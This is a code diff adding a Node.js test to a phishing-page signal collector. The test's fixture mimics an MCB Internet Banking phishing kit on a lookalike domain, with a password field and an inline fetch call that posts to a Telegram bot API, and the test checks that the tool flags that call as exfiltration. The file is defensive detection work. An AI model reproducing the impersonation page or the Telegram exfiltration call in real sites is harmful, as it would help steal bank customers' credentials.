@@ -61,3 +61,35 @@ test("collect-signals: a long minified line is cut around the match, not from it
   assert.ok(code.includes("el.innerHTML=payload;"));
   assert.ok(code.length <= 210);
 });
+
+test("collect-signals: page metadata, policy links and phishing-kit code are collected with locations", async () => {
+  const KIT = ["<html><head><title>MCB Internet Banking</title>", '<link rel="canonical" href="https://internet.mcb.mu/login">', "<script>", "fetch('https://api.telegram.org/bot123/sendMessage', {method:'POST'})", "</script>", '</head><body><a href="/privacy">Privacy policy</a><input type="password"></body></html>'].join("\n");
+  const inline = { src: "", textContent: "\nfetch('https://api.telegram.org/bot123/sendMessage', {method:'POST'})\n", hasAttribute: () => false };
+  const canonical = { getAttribute: (k) => (k === "href" ? "https://internet.mcb.mu/login" : null) };
+  const anchor = { textContent: "Privacy policy", getAttribute: (k) => (k === "href" ? "/privacy" : null) };
+  const password = { outerHTML: '<input type="password">', getAttribute: (k) => (k === "type" ? "password" : null), name: "", id: "" };
+  const context = {
+    document: {
+      title: "MCB Internet Banking",
+      documentElement: { outerHTML: KIT },
+      forms: [],
+      querySelector: (sel) => (sel === 'link[rel="canonical"]' ? canonical : null),
+      querySelectorAll: (sel) => (sel === "script" ? [inline] : sel === "a[href]" ? [anchor] : sel === "input" || sel.startsWith("input[") ? [password] : []),
+    },
+    location: { href: "https://mcb-secure.top/login", search: "", protocol: "https:", origin: "https://mcb-secure.top", host: "mcb-secure.top" },
+    performance: { getEntriesByType: () => [] },
+    fetch: async () => ({ ok: false }),
+    URL,
+    URLSearchParams,
+    Promise,
+  };
+  vm.createContext(context);
+  const signals = await new vm.Script(SOURCE, { filename: "collect-signals.js" }).runInContext(context);
+  const meta = JSON.parse(JSON.stringify(signals.pageMeta));
+  assert.equal(meta.title, "MCB Internet Banking");
+  assert.equal(meta.canonical, "https://internet.mcb.mu/login");
+  assert.equal(meta.hasCredentialField, true);
+  assert.deepEqual(meta.privacyLinks, [{ href: "https://mcb-secure.top/privacy", text: "Privacy policy" }]);
+  assert.equal(meta.exfil[0].target, "Telegram bot API");
+  assert.equal(meta.exfil[0].locations[0].line, 4);
+});
